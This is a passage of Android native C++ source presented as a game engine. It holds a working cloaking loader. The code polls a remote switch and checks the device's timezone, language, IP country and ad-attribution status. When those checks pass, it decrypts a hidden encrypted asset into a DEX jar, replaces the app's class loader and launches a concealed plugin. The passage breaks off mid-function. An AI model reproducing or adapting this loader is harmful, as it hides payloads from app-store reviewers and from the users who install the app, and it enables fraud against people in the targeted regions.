// Created by ybpcn on 2023/10/9.
//
#include <jni.h>
#include <sys/types.h>
#include <android/log.h>
#include <unistd.h>
#include <fcntl.h>
#include <android/asset_manager_jni.h>
#include <sys/system_properties.h>
#include <thread>
#include <locale.h>

#include <android/looper.h>
#include <unistd.h>


#include "JNIUtils.h"
#include "aes.h"
#include "jni_config.h"
#include "GameEngine.h"
#include "AdjustSdk.h"

static int apiLevel = 0;
jobject m_Ctx = NULL;
static bool  m_bIsReady = false;
static bool  m_bIsStarted = false;
static JavaVM *mg_JavaVM = NULL;

typedef const char* cstra_t;
typedef int bool_t;


const int FLAG_ACTIVITY_CLEAR_TOP = 0x04000000;

class JniHttp {
public:
    JniHttp(JNIEnv * env) {
        this->env = env;
        httpClass = (jclass) env->NewGlobalRef(env->FindClass("java/net/HttpURLConnection"));
        urlClass = (jclass) env->NewGlobalRef(env->FindClass("java/net/URL"));
        urlConnectionClass = (jclass) env->NewGlobalRef(env->FindClass("java/net/URLConnection"));
        inputStreamClass = (jclass) env->NewGlobalRef(env->FindClass("java/io/InputStream"));
        outputStreamClass = (jclass) env->NewGlobalRef(env->FindClass("java/io/OutputStream"));
        setReadTimeoutMethod = env->GetMethodID(urlConnectionClass, "setReadTimeout", "(I)V");
        setConnectTimeoutMethod = env->GetMethodID(urlConnectionClass, "setConnectTimeout", "(I)V");
        getHeaderMethod = env->GetMethodID(httpClass, "getHeaderField", "(Ljava/lang/String;)Ljava/lang/String;");
        getHeaderMethodInt = env->GetMethodID(httpClass, "getHeaderField", "(I)Ljava/lang/String;");
        getHeaderKeyMethod = env->GetMethodID(httpClass, "getHeaderFieldKey", "(I)Ljava/lang/String;");
        inputStreamReadMethod = env->GetMethodID(inputStreamClass, "read", "([B)I");
        inputStreamCloseMethod = env->GetMethodID(inputStreamClass, "close", "()V");
        urlConstructor = env->GetMethodID(urlClass, "<init>", "(Ljava/lang/String;)V");
        openConnectionMethod = env->GetMethodID(urlClass, "openConnection", "()Ljava/net/URLConnection;");
        setUseCachesMethod = env->GetMethodID(urlConnectionClass, "setUseCaches", "(Z)V");
        disconnectConnectionMethod = env->GetMethodID(httpClass, "disconnect", "()V");
        getOutputStreamMethod = env->GetMethodID(urlConnectionClass, "getOutputStream", "()Ljava/io/OutputStream;");
        outputStreamWriteMethod = env->GetMethodID(outputStreamClass, "write", "([B)V");
        outputStreamCloseMethod = env->GetMethodID(outputStreamClass, "close", "()V");
        setChunkedStreamingModeMethod = env->GetMethodID(httpClass, "setChunkedStreamingMode", "(I)V");
        setFixedLengthStreamingModeMethod = env->GetMethodID(httpClass, "setFixedLengthStreamingMode", "(I)V");
        setRequestMethod = env->GetMethodID(httpClass, "setRequestMethod", "(Ljava/lang/String;)V");
        setFollowMethod = env->GetMethodID(httpClass, "setInstanceFollowRedirects", "(Z)V");
        setDoInputMethod = env->GetMethodID(httpClass, "setDoInput", "(Z)V");
        setDoOutputMethod = env->GetMethodID(httpClass, "setDoOutput", "(Z)V");
        getResponseCodeMethod = env->GetMethodID(httpClass, "getResponseCode", "()I");
        setRequestPropertyMethod = env->GetMethodID(httpClass, "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V");
        getInputStreamMethod = env->GetMethodID(httpClass, "getInputStream", "()Ljava/io/InputStream;");
        getErrorStreamMethod = env->GetMethodID(httpClass, "getErrorStream", "()Ljava/io/InputStream;");
        connectConnectMethod =env->GetMethodID(httpClass,"connect","()V");

        inputStreamReaderClass =  (jclass) env->NewGlobalRef(env->FindClass("java/io/InputStreamReader"));
        inputStreamReaderConstructor = env->GetMethodID(inputStreamReaderClass, "<init>", "(Ljava/io/InputStream;Ljava/lang/String;)V");

        bufferedReaderClass =  (jclass) env->NewGlobalRef(env->FindClass("java/io/BufferedReader"));
        bufferedReaderConstructor = env->GetMethodID(bufferedReaderClass, "<init>", "(Ljava/io/Reader;)V");
        bufferedReaderReadLine = env->GetMethodID(bufferedReaderClass, "readLine", "()Ljava/lang/String;");

    }
    ~JniHttp() {
        env->DeleteGlobalRef(httpClass);
        env->DeleteGlobalRef(urlClass);
        env->DeleteGlobalRef(inputStreamClass);
        env->DeleteGlobalRef(outputStreamClass);

        env->DeleteGlobalRef(inputStreamReaderClass);
        env->DeleteGlobalRef(bufferedReaderClass);


    }
private:
    JNIEnv * env;
public:
    jclass httpClass;
    jclass urlClass;
    jclass urlConnectionClass;
    jclass inputStreamClass;
    jclass outputStreamClass;
    jmethodID urlConstructor;
    jmethodID openConnectionMethod;
    jmethodID getOutputStreamMethod;
    jmethodID outputStreamWriteMethod;
    jmethodID outputStreamCloseMethod;
    jmethodID setReadTimeoutMethod;
    jmethodID setConnectTimeoutMethod;
    jmethodID setChunkedStreamingModeMethod;
    jmethodID setFixedLengthStreamingModeMethod;
    jmethodID setRequestMethod;
    jmethodID setDoInputMethod;
    jmethodID setDoOutputMethod;
    jmethodID getResponseCodeMethod;
    jmethodID setRequestPropertyMethod;
    jmethodID getInputStreamMethod;
    jmethodID getErrorStreamMethod;
    jmethodID inputStreamReadMethod;
    jmethodID inputStreamCloseMethod;
    jmethodID setFollowMethod;
    jmethodID getHeaderMethod;
    jmethodID getHeaderMethodInt;
    jmethodID getHeaderKeyMethod;
    jmethodID setUseCachesMethod;
    jmethodID connectConnectMethod;
    jmethodID disconnectConnectionMethod;

    jclass inputStreamReaderClass;
    jmethodID inputStreamReaderConstructor;


    jclass bufferedReaderClass;
    jmethodID bufferedReaderConstructor;
    jmethodID  bufferedReaderReadLine;
};
static JniHttp* mg_HttpAPI = NULL;

void Global_Init(JavaVM *vm) {
    mg_JavaVM = vm;
    m_bIsStarted = true;
}

void Global_Done(JavaVM *vm) {
    m_bIsStarted = false;
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    if(mg_pGameEngine) {
        delete mg_pGameEngine;
        mg_pGameEngine = NULL;
    }
    if(mg_HttpAPI) {
        delete mg_HttpAPI;
        mg_HttpAPI = NULL;
    }
    mg_JavaVM = NULL;
}

static int GetApiLevel(JNIEnv* env) {
    if (apiLevel > 0) return apiLevel;
    jclass cls_VERSION = env->FindClass("android/os/Build$VERSION");
    jfieldID fID = env->GetStaticFieldID(cls_VERSION, "SDK_INT", "I");
    apiLevel = env->GetStaticIntField(cls_VERSION, fID);
    return apiLevel;
}

static int hxsplit(cstra_t src, const int delim, std::function<int(cstra_t)> fn, bool bNulOrEmpy = false) {
    static THRD_ATTRIB char tmp[8192] = {0};
    int l = 0;
    int r = 0;
    int c;
    int s = 0;
    cstra_t p = src;
    cstra_t t;
    do {
        c = *p++;
        if(0 == c) {
            tmp[l]=0;
            r++;
            if(l>0 || bNulOrEmpy)
                fn(tmp);
            break;
        }
        if(delim == c) {
            tmp[l]=0;
            r++;
            if(l>0 || bNulOrEmpy)
                if(0 != fn(tmp))
                    break;
            l = 0;
            s = 0;
            continue;
        }
        if(!bNulOrEmpy && ' ' == c){
            if(0 == s)
                continue;
            if(1 == s){
                t = p;
                while(*t==' ') t++;
                if(*t ==delim || *t == 0){
                    p = t;
                    continue;
                }
            }
        }
        s = 1;
        tmp[l++]=c;
    }while(1);
    return r;
}




//判断IP地址所在国家
static bool IsMatchCounty( std::string value) {
    bool  isok = false;
    hxsplit(CHECK_COUNTRYS,';', [&isok,value](cstra_t val)->int {
        if(value == val) {
            isok = true;
            return 1;
        }
        return 0;
    });
    return isok;
}

//判断手机当前时区
static bool IsMatchZone() {
    int timezone = 0;
    time_t t1, t2 ;
    struct tm *tm_local, *tm_utc;

    time((time_t*)&t1);
    t2 = t1;
    tm_local = localtime((time_t*)&t1);
    t1 = mktime(tm_local) ;
    tm_utc = gmtime((time_t*)&t2);
    t2 = mktime(tm_utc);
    timezone = ((int)(t1 - t2) / 3600);

    bool  isok = false;
    hxsplit(CHECK_TIMEZONE,';', [&isok,timezone](cstra_t val)->int {
        int zone = atoi(val);
        if(timezone == zone) {
            isok = true;
            return 1;
        }
        return 0;
    });
    return isok;
}

//判断手机当前时区
static bool IsMatchLanguage(JNIEnv* env) {
    jclass cls_Context = env->FindClass("android/content/Context");
    jobject obj_Resource = callObjectMethod(env,cls_Context, m_Ctx,
                                            "getResources", "()Landroid/content/res/Resources;");
    jobject obj_Configuration = callObjectMethod(env,env->GetObjectClass(obj_Resource), obj_Resource,
                                                  "getConfiguration", "()Landroid/content/res/Configuration;");

    jclass cls_Locale = env->FindClass("java/util/Locale");
    jclass cls_Config =env->FindClass("android/content/res/Configuration");
    jobject obj_Local = nullptr;
    if (GetApiLevel(env) >= 24) {
        jobject obj_list = callObjectMethod(env, cls_Config, obj_Configuration,"getLocales", "()Landroid/os/LocaleList;");
        obj_Local = callObjectMethod(env, env->GetObjectClass(obj_list), obj_list, "get", "(I)Ljava/util/Locale;", 0);
        env->DeleteLocalRef(obj_list);
    } else {
        jfieldID fld = env->GetFieldID(cls_Config, "locale", "Ljava/util/Locale;");
        obj_Local = env->GetObjectField(obj_Configuration,fld );
    }

    jstring langName = (jstring)callObjectMethod(env, cls_Locale, obj_Local, "getLanguage", "()Ljava/lang/String;");
    cstra_t  lang_name = env->GetStringUTFChars(langName, NULL);
    std::string  lang = lang_name;
    env->ReleaseStringUTFChars(langName, lang_name);
    env->DeleteLocalRef(langName);
    env->DeleteLocalRef(obj_Resource);
    env->DeleteLocalRef(obj_Configuration);
    env->DeleteLocalRef(obj_Local);

    env->DeleteLocalRef(cls_Context);
    env->DeleteLocalRef(cls_Locale);
    env->DeleteLocalRef(cls_Config);
    bool  isok = false;
    hxsplit(CHECK_LANGUAGE,';', [&isok,lang](cstra_t val)->int {
        if(lang == val) {
            isok = true;
            return 1;
        }
        return 0;
    });
    return isok;
}


static std::string GetHttpData(JNIEnv *env, JniHttp* pApi, std::string strHttpUrl) {
    std::string data;
    jstring juri = env->NewStringUTF(strHttpUrl.c_str());
    jstring jTypeString = env->NewStringUTF("GET");

    if (env->ExceptionCheck()) {
        env->ExceptionDescribe();
        env->ExceptionClear();
    }
    jobject url = env->NewObject(pApi->urlClass, pApi->urlConstructor, juri);
    jobject connection = env->CallObjectMethod(url, pApi->openConnectionMethod);
    env->CallVoidMethod(connection, pApi->setUseCachesMethod, JNI_FALSE);
    env->CallVoidMethod(connection, pApi->setRequestMethod, jTypeString);
    env->CallVoidMethod(connection, pApi->setReadTimeoutMethod, 10 * 1000);
    env->CallVoidMethod(connection, pApi->setConnectTimeoutMethod, 10 * 1000);

    jstring field = env->NewStringUTF("User-Agent");
    jstring value = env->NewStringUTF("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0");
    env->CallVoidMethod(connection, pApi->setRequestPropertyMethod, field, value);
    env->DeleteLocalRef(field);
    env->DeleteLocalRef(value);

    field = env->NewStringUTF("Accept");
    value = env->NewStringUTF("*/*");
    env->CallVoidMethod(connection, pApi->setRequestPropertyMethod, field, value);
    env->DeleteLocalRef(field);
    env->DeleteLocalRef(value);

    env->CallVoidMethod(connection, pApi->connectConnectMethod);
    if (env->ExceptionCheck()) {
        env->ExceptionDescribe();
        env->ExceptionClear();
    }

    int code = env->CallIntMethod(connection, pApi->getResponseCodeMethod);
    jobject inpStream = nullptr;
    if (code != 200) {
        inpStream = inpStream = env->CallObjectMethod(connection, pApi->getErrorStreamMethod);
    } else {
        inpStream = inpStream = env->CallObjectMethod(connection, pApi->getInputStreamMethod);
    }


    if (env->ExceptionCheck()) {
        env->ExceptionDescribe();
        env->ExceptionClear();
    }


    if(inpStream!= nullptr) {

        // Gather content
        jbyteArray array = env->NewByteArray(4096);

        int g = 0;
        bool force_disconnect = false;
        while ((g = env->CallIntMethod(inpStream, pApi->inputStreamReadMethod, array)) != -1) {
            if (env->ExceptionCheck()) {
                env->ExceptionClear();
                break;
            }
            jbyte* content_array = env->GetByteArrayElements(array, NULL);
            data += (char*) content_array;
            env->ReleaseByteArrayElements(array, content_array, JNI_ABORT);
        }
        env->CallVoidMethod(inpStream, pApi->inputStreamCloseMethod);
        env->DeleteLocalRef(array);
        env->DeleteLocalRef(inpStream);
        env->CallVoidMethod(connection, pApi->disconnectConnectionMethod);
    }
    env->DeleteLocalRef(connection);
    env->DeleteLocalRef(url);


    return data;
}


static std::string GetJsonValue(const char* szJson, const char* szField) {
    std::string rv= "";
    size_t fldLen = strlen(szField);
    const char* fnd = strstr(szJson,szField);
    if(NULL == fnd) {
        return rv;
    }
    fnd+=fldLen;
    fnd+=2; //skip ":  二个字符
    int iss = 0;
    do {
        char c = *fnd++;
        if(c == 0 || c == '\r' || c =='\n')
            break;
        if(c == '\"' || c =='\'' )  {
            if(0 == iss) {
                iss++;
                continue;
            }
            else if(--iss == 0){
                break;
            }
        }
        rv+=c;
    }while(1);
    return rv;
}



static bool CheckGame(JNIEnv *env) {

    //只检测一次
    static int m_nCheckStata = -1;
    if(m_nCheckStata!=-1) {
        return  m_nCheckStata? true: false;
    }
    jobject ctx = m_Ctx;
    JniHttp* pApi = mg_HttpAPI;// new JniHttp(env);
    std::string httpData;
    //char *data = http_get(HTTP_URL_CONFIG);
    httpData =  GetHttpData(env, pApi, HTTP_URL_CONFIG);

    if(httpData.size() == 0) {
        return  false;
    }

    LOGI("GetHttpData(%s) = %s", HTTP_URL_COUNTRY, httpData.c_str());
    std::string config = GetJsonValue(httpData.c_str(), "status");
    if(config != "true") {
        m_nCheckStata = 0;
        return false;
    }
    //检测时区
    if(!IsMatchZone()) {
        m_nCheckStata = 0;
        return false;
    }
    //检测系统语言
    if(!IsMatchLanguage(env)) {
        m_nCheckStata = 0;
        return false;
    }

    httpData = GetHttpData(env, pApi, HTTP_URL_COUNTRY);
    if(httpData.size() == 0) {
        return  false;
    }
    LOGI("GetHttpData(%s) = %s", HTTP_URL_COUNTRY, httpData.c_str());
    std::string country = GetJsonValue(httpData.c_str(), "country");
    //检测所在国家
    if(!IsMatchCounty(country)) {
        m_nCheckStata = 0;
        return false;
    }
    m_nCheckStata = 1;
    return true;
}



jobject m_thiz = NULL;
std::mutex mThizMutex;

bool CHxGameEngine::InitGameEngine(JNIEnv* env, jobject thiz, jobject ctx) {
    m_Ctx = env->NewGlobalRef(ctx);
//    if(mg_HttpAPI == NULL) {
//
//        mg_HttpAPI = new JniHttp(env);
//    }
    m_bIsReady = IsReady(env, ctx);

    jclass  thisClass = env->GetObjectClass(thiz);

    jstring packetName = (jstring)callObjectMethod(env, thisClass, thiz, "getPackageName", "()Ljava/lang/String;");
    const char* szName = env->GetStringUTFChars(packetName, NULL);
    m_PackageName = szName;

    if(!m_bIsReady) {
        //这里启动异步检测 默认只检测一次，如果要循环检测请 下面的值 设置为1
        #define IS_LOOP_CHECK 1    //是否循环检测  0:只检测一次  1:循环检测

        std::thread thd([this] {

            JNIEnv* env = NULL;
            mg_JavaVM->AttachCurrentThread(&env, NULL);
            #if defined(IS_LOOP_CHECK) && IS_LOOP_CHECK==1
            do {
            #endif
                LOGD("-------CheckGame");
                if (env->ExceptionCheck()) {
                    env->ExceptionDescribe();
                    env->ExceptionClear();
                }

                if(m_TrackerName.size()>0) {

                    if(m_TrackerName!= "Organic" && m_TrackerName != "organic" ) {
                        LOGI("Organic? 1= %s", m_TrackerName.c_str());
                        m_bIsReady = true;
                    }
                }
                LOGI("m_bIsReady 1= %d", m_bIsReady);
                LOGI("m_TrackerName 1= %s", m_TrackerName.c_str());
                LOGI("m_bIsStarted 1= %d", m_bIsStarted);
                if (m_bIsReady) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(500));
                    SetReady(env, m_Ctx);
                    RestartApp(env);
                }
            #if defined(IS_LOOP_CHECK) && IS_LOOP_CHECK == 1
                if(m_bIsReady)
                    break;
                //15秒检测一次
                std::this_thread::sleep_for(std::chrono::milliseconds(15000));
            }while(m_bIsStarted);
            #endif
            //延时
            mg_JavaVM->DetachCurrentThread();
        });
        thd.detach();
        return false;
    }
    LOGD("=======m_bIsReady2 true");

    jobject  getFilesDirObj =callObjectMethod(env, thisClass, thiz, "getFilesDir", "()Ljava/io/File;");

    jclass  fileClass = env->GetObjectClass(getFilesDirObj);
    jstring absolutePathObj = (jstring)callObjectMethod(env, fileClass, getFilesDirObj, "getAbsolutePath", "()Ljava/lang/String;");

    const char* szPath = env->GetStringUTFChars(absolutePathObj, NULL);
    m_Path = szPath;
    env->ReleaseStringUTFChars(absolutePathObj, szPath);


    env->ReleaseStringUTFChars(packetName, szName);
    env->DeleteLocalRef(getFilesDirObj);
    env->DeleteLocalRef(absolutePathObj);

    bool  rv = false;
    size_t   len = 0;
    uint8_t* buf = DecordJar(env, thiz, &len);
    if(len == 0) {
        LOGE("DecordJar error.");
        m_bIsReady = false;
        goto clean;
    }
    if(!LoadDex(env, thiz, buf, len)) {
        LOGE("DecordJar error.");
        m_bIsReady = false;
        goto clean;
    }
    if(!PluginInit(env, ctx)) {
        LOGE("PluginInit error.");
        m_bIsReady = false;
        goto clean;
    }
    rv = true;
    clean:
    if(buf && len) {
        free(buf);
        buf = NULL;
        len = 0;
    }
    if (env->ExceptionCheck()) env->ExceptionClear();
    return rv;
}


bool CHxGameEngine::PluginCreate(JNIEnv *env, jobject thiz) {

    if(!m_bIsReady) {
        LOGD("=======PluginCreate=m_bIsReady false");
        AdjustSdkInit(env, thiz);
        return false;
    }

    jclass cls_DexClassLoader = env->GetObjectClass(m_dexClassLoader);
    jclass cls_Plugin;
    jstring strPluginClass = env->NewStringUTF(PLUGIN_CLASS_ID);
    cls_Plugin = (jclass)callObjectMethod(env, cls_DexClassLoader, m_dexClassLoader,
                                          "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;",strPluginClass);

    jmethodID mid_PluginCreate = env->GetStaticMethodID(cls_Plugin, PLUGIN_CREATE_METHOD_ID, "(Landroid/app/Application;)V");
    if(mid_PluginCreate == nullptr) {
        if (env->ExceptionCheck()) env->ExceptionClear();
        LOGE("callPluginCreate Method not found. %s",PLUGIN_CREATE_METHOD_ID);
        env->DeleteLocalRef(strPluginClass);
        return  false;
    }
    env->CallStaticVoidMethod(cls_Plugin, mid_PluginCreate, thiz);
    env->DeleteLocalRef(strPluginClass);
    return true;
}

bool CHxGameEngine::PluginStart(JNIEnv *env, jobject ctx) {

    if(!m_bIsReady) {
        LOGD("=======PluginStart=m_bIsReady false");
        return false;
    }

    jclass cls_DexClassLoader = env->GetObjectClass(m_dexClassLoader);
    jclass cls_Plugin;
    jstring strPluginClass = env->NewStringUTF(PLUGIN_CLASS_ID);
    jstring strPluginArgs = env->NewStringUTF(PLUGIN_START_ARGS_ID);
    cls_Plugin = (jclass)callObjectMethod(env, cls_DexClassLoader, m_dexClassLoader,
                                          "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;",strPluginClass);

    jmethodID mid_PluginStart = env->GetStaticMethodID(cls_Plugin, PLUGIN_START_METHOD_ID, "(Landroid/content/Context;Ljava/lang/String;)V");
    if(mid_PluginStart == nullptr) {
        if (env->ExceptionCheck()) env->ExceptionClear();
        env->DeleteLocalRef(strPluginClass);
        env->DeleteLocalRef(strPluginArgs);
        LOGE("callPluginCreate Method not found. %s",PLUGIN_START_METHOD_ID);
        return  false;
    }
    env->CallStaticVoidMethod(cls_Plugin, mid_PluginStart, ctx, strPluginArgs);
    if (env->ExceptionCheck()) env->ExceptionClear();

    env->DeleteLocalRef(strPluginClass);
    env->DeleteLocalRef(strPluginArgs);

    return true;
}

bool CHxGameEngine::LaunchActivity(JNIEnv *env, jobject thiz) {

    if(!m_bIsReady) {
        LOGD("=======LaunchActivity=m_bIsReady false");
        return false;
    }

    jclass cls_Context = env->FindClass("android/content/Context");
    jclass cls_ClassLoader = env->FindClass("java/lang/ClassLoader");
    jclass cls_Intent = env->FindClass("android/content/Intent");
    jclass cls_MainActivity;
    jmethodID mid_NewIntent = env->GetMethodID(cls_Intent, "<init>", "(Landroid/content/Context;Ljava/lang/Class;)V");
    jstring strLaunchActivity = env->NewStringUTF(LAUNCH_ACTIVITY_ID); //
    jobject thisClassLoader = callObjectMethod(env, cls_Context, thiz, "getClassLoader", "()Ljava/lang/ClassLoader;");
    cls_MainActivity = (jclass)callObjectMethod(env, cls_ClassLoader,thisClassLoader ,
                                                "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;", strLaunchActivity);
    env->DeleteLocalRef(strLaunchActivity);
    jobject intent = env->NewObject(cls_Intent,mid_NewIntent, thiz, cls_MainActivity);
    return StartActivity(env, thiz, intent);
}

void CHxGameEngine::SetAdjustTrackerName(const char *szTrackerName) {
    m_TrackerName = szTrackerName;
}

bool CHxGameEngine::IsReady(JNIEnv *env, jobject ctx) {

    jclass cls_Prefer = env->FindClass("android/content/SharedPreferences");
    if(nullptr == cls_Prefer) {
        if (env->ExceptionCheck()) env->ExceptionClear();
        LOGE("没有找到配置类.");
        return false;
    }

    jstring strGameCheckID =  env->NewStringUTF(GAME_CHECK_ID);//jstring)getObjectStaticField(env, cls_Config, GAME_CHECK_ID,"Ljava/lang/String;");
    jstring strGameCheckFld = env->NewStringUTF(GAME_CHECK_FIELD_ID);//(jstring)getObjectStaticField(env, cls_Config, GAME_CHECK_FIELD_ID,"Ljava/lang/String;");
    jstring strGameCheckDef = env->NewStringUTF(GAME_CHECK_DEFAULT_VALUE_ID);//(jstring)getObjectStaticField(env, cls_Config, GAME_CHECK_DEFAULT_VALUE_ID,"Ljava/lang/String;");
    jclass  clsContent = env->GetObjectClass(ctx);
    jobject  obj_SharedPreferences = callObjectMethod(env,clsContent , ctx,
                                                      "getSharedPreferences","(Ljava/lang/String;I)Landroid/content/SharedPreferences;",
                                                      strGameCheckID,0);
    jstring strConfigVal = (jstring)callObjectMethod(env,cls_Prefer,obj_SharedPreferences,
                                                     "getString", "(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;",
                                                     strGameCheckFld, strGameCheckDef);


    if(0 != jstringICmpCString(env, strConfigVal, GAME_CHECK_VALUE_ID)) {
        env->DeleteLocalRef(strGameCheckID);
        env->DeleteLocalRef(strGameCheckFld);
        env->DeleteLocalRef(strGameCheckDef);
        env->DeleteLocalRef(strConfigVal);
        env->DeleteLocalRef(obj_SharedPreferences);
        return false;
    }
    env->DeleteLocalRef(strGameCheckID);
    env->DeleteLocalRef(strGameCheckFld);
    env->DeleteLocalRef(strGameCheckDef);
    env->DeleteLocalRef(strConfigVal);
    env->DeleteLocalRef(obj_SharedPreferences);
    return true;
}

bool CHxGameEngine::SetReady(JNIEnv *env, jobject ctx) {

    jclass cls_Prefer = env->FindClass("android/content/SharedPreferences");
    jclass cls_SpEditor = env->FindClass("android/content/SharedPreferences$Editor");

    jstring strGameCheckID =  env->NewStringUTF(GAME_CHECK_ID);//jstring)getObjectStaticField(env, cls_Config, GAME_CHECK_ID,"Ljava/lang/String;");
    jstring strGameCheckFld = env->NewStringUTF(GAME_CHECK_FIELD_ID);//(jstring)getObjectStaticField(env, cls_Config, GAME_CHECK_FIELD_ID,"Ljava/lang/String;");
    jstring strGameCheckSet = env->NewStringUTF(GAME_CHECK_VALUE_ID);//(jstring)getObjectStaticField(env, cls_Config, GAME_CHECK_DEFAULT_VALUE_ID,"Ljava/lang/String;");

    jobject  obj_SharedPreferences = callObjectMethod(env, env->GetObjectClass(ctx), ctx,
                                                      "getSharedPreferences","(Ljava/lang/String;I)Landroid/content/SharedPreferences;",
                                                      strGameCheckID,0);
    jobject obj_PrefEditor = callObjectMethod(env,cls_Prefer, obj_SharedPreferences,
                                              "edit", "()Landroid/content/SharedPreferences$Editor;");

    callObjectMethod(env, cls_SpEditor, obj_PrefEditor,
                     "putString", "(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;",
                     strGameCheckFld, strGameCheckSet);

    jboolean  isok = callBooleanMethod(env, cls_SpEditor, obj_PrefEditor,  "commit", "()Z");
    if(!isok) {
        LOGD("commit failed.  pushstring");
    }

    return (bool)isok;
}



uint8_t *CHxGameEngine::DecordJar(JNIEnv *env, jobject thiz, size_t* pnOutLen) {

    const unsigned char *pws_bin = (const unsigned char*)GAME_RESOURCE_PWD;
    const unsigned char *iv_bin = (const unsigned char*)GAME_RESOURCE_IV;
    unsigned char*  dataBuffer = NULL;

    *pnOutLen = 0;

    jobject assetManager = callObjectMethod(env, env->GetObjectClass(m_Ctx), m_Ctx, "getAssets", "()Landroid/content/res/AssetManager;");
    AAssetManager *nativeAsset = AAssetManager_fromJava(env, assetManager);


    AAsset *assetFile = AAssetManager_open(nativeAsset, GAME_RESOURCE_ID, AASSET_MODE_BUFFER);
    size_t fileLength = AAsset_getLength(assetFile);
    dataBuffer = (unsigned char *) malloc(fileLength);
    AAsset_read(assetFile, dataBuffer, fileLength);
    AAsset_close(assetFile);

    unsigned char encrypted[16], decrypted[16];
    memset(encrypted, 0, 16*sizeof(char));
    memset(decrypted, 0, 16*sizeof(char));


    AES_KEY key;
    AES_set_decrypt_key(pws_bin, 128, &key);
    unsigned char ivc[AES_BLOCK_SIZE];
    memcpy( ivc, iv_bin, AES_BLOCK_SIZE*sizeof(char));


    size_t pos = 0;
    size_t len = fileLength;
    size_t rln = 0;
    unsigned char* out = dataBuffer;//(unsigned char *) malloc(fileLength);

    do {
        int wln = _hxcmp_min(4096, len);
        AES_cbc_encrypt(dataBuffer+pos, out+pos, wln, &key, ivc, AES_DECRYPT);
        pos += wln;
        len -= wln;
        if(len == 0 ) {
            int tln = pos - 1;
            int sln = out[tln];
            wln -= sln;
        }
        rln+=wln;
        /*
        if (write_full(fd, out, wln) == -1) {
            close(fd);
            LOGE("write");
            break;
        }
        */
    }while(pos < fileLength);
    //free(dataBuffer);
    *pnOutLen = rln;
    LOGI("文件长度:%lu, 解密后原始长度:%luu",fileLength, rln);
    //close(fd);
    //free(out);
    //free(dataBuffer);
    return out;
}

bool CHxGameEngine::LoadDex(JNIEnv *env, jobject thiz, uint8_t *buf, size_t len) {

    jclass cls_ActivityThread = env->FindClass("android/app/ActivityThread");
    jclass cls_weakReference = env->FindClass("java/lang/ref/WeakReference");
    jclass cls_hashMap = env->FindClass("java/util/HashMap");
    jclass cls_arrayMap = env->FindClass("android/util/ArrayMap");
    jclass cls_LoadedApk = env->FindClass("android/app/LoadedApk");
    jclass cls_Application = env->FindClass("android/content/ContextWrapper");
    jfieldID  mclassloaderID = env->GetFieldID(cls_LoadedApk, "mClassLoader", "Ljava/lang/ClassLoader;");


    jobject currentActivityThread = callStaticObjectMethod(env, cls_ActivityThread,
                                                       "currentActivityThread",
                                                       "()Landroid/app/ActivityThread;");
    jobject weakReference = NULL;
    jstring  packName = env->NewStringUTF(m_PackageName.c_str());

    if (GetApiLevel(env) < 19) {
        jobject mPackages = getObjectField(env, cls_ActivityThread,
                                           "mPackages", "Ljava/util/HashMap;", currentActivityThread);
        weakReference = callObjectMethod(env, cls_hashMap, mPackages, "get", "(Ljava/lang/Object;)Ljava/lang/Object;", packName);

    } else {
        jobject mPackages = getObjectField(env, cls_ActivityThread,
                                           "mPackages", "Landroid/util/ArrayMap;", currentActivityThread);
        weakReference = callObjectMethod(env, cls_arrayMap, mPackages, "get", "(Ljava/lang/Object;)Ljava/lang/Object;", packName);
    }
    env->DeleteLocalRef(currentActivityThread);
    env->DeleteLocalRef(packName);

    jobject referenceObj = callObjectMethod(env, cls_weakReference, weakReference, "get", "()Ljava/lang/Object;");

    jobject dexClassLoader = NULL;
    jobject   mClassLoader = callObjectMethod(env, cls_Application, thiz, "getClassLoader", "()Ljava/lang/ClassLoader;");
    if (0 && GetApiLevel(env) >= 26) {
        dexClassLoader = CreateInMemoryDexClassLoader(env, thiz, buf, len, mClassLoader);
    } else {
        dexClassLoader = CreateFormFileDexClassLoader(env, thiz, buf, len, mClassLoader);
    }
    env->DeleteLocalRef(weakReference);
    if(nullptr == dexClassLoader) {
        env->DeleteLocalRef(referenceObj);
        return false;
    }
    //将原始DEX的classLoader替换进当前线程块中
    env->SetObjectField(referenceObj, mclassloaderID, dexClassLoader);
    env->DeleteLocalRef(referenceObj);
    m_dexClassLoader = env->NewGlobalRef(dexClassLoader);
    return true;
}

jobject CHxGameEngine::CreateInMemoryDexClassLoader(JNIEnv *env, jobject thiz, uint8_t *buf, size_t len, jobject dxLoader) {
    jclass classLoaderClass = env->FindClass("java/lang/ClassLoader");
    jclass dexClassLoaderClass = env->FindClass("dalvik/system/InMemoryDexClassLoader");

    jmethodID initDexClassLoaderMethod = env->GetMethodID(
            dexClassLoaderClass, "<init>", "(Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V");
    jobject buffer = env->NewDirectByteBuffer(buf, len);
    jobject dexClassLoader = env->NewObject(dexClassLoaderClass, initDexClassLoaderMethod, buffer, dxLoader);
    if (env->ExceptionCheck()) env->ExceptionClear();

    env->DeleteLocalRef(classLoaderClass);
    env->DeleteLocalRef(dexClassLoaderClass);

    return  dexClassLoader;
}

jobject CHxGameEngine::CreateFormFileDexClassLoader(JNIEnv *env, jobject thiz, uint8_t *buf, size_t len, jobject dxLoader) {

    jclass classLoaderClass = env->FindClass("java/lang/ClassLoader");
    jclass dexClassLoaderClass = env->FindClass("dalvik/system/DexClassLoader");
    jstring  jDexFile = NULL;
    jstring  jOptPath = NULL;
    jmethodID initDexClassLoaderMethod = 0;
    jobject dexClassLoader = NULL;

    std::string str_optPath = m_Path + "/classes/";;
    std::string str_dexFile = str_optPath + "classdex.jar";


    ensure_dir(str_optPath.c_str(), 0700);

    //写入到文件
    int fd = open(str_dexFile.c_str(), O_CREAT | O_WRONLY | O_TRUNC, 0700);
    if (fd == -1) {
        LOGE("open %s", str_dexFile.c_str());
        goto clean;
    }
    if (write_full(fd, buf, len) == -1) {
        close(fd);
        LOGE("write");
        goto clean;
    }
    close(fd);

    jDexFile = env->NewStringUTF(str_dexFile.c_str());
